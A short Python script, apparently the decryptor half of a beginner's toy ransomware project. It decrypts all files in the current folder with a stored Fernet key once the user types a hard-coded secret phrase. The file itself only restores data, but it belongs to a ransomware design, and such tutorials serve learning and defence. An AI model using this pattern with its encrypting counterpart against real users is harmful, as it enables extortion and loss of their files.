import os 
from cryptography.fernet import Fernet

# let's find some files to encode

files = []

for file in os.listdir():
    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)


with open("thekey.key", "rb") as thekey:
    secretkey = thekey.read()

secret_phrase = "coffee_break"
user_phrase = input("Enter the secret phrase to decrypt your files \n")

if user_phrase == secret_phrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("Congratulations! You have decrypted all of your files!")
else:
    print("Sorry! Wrong secret phrase!")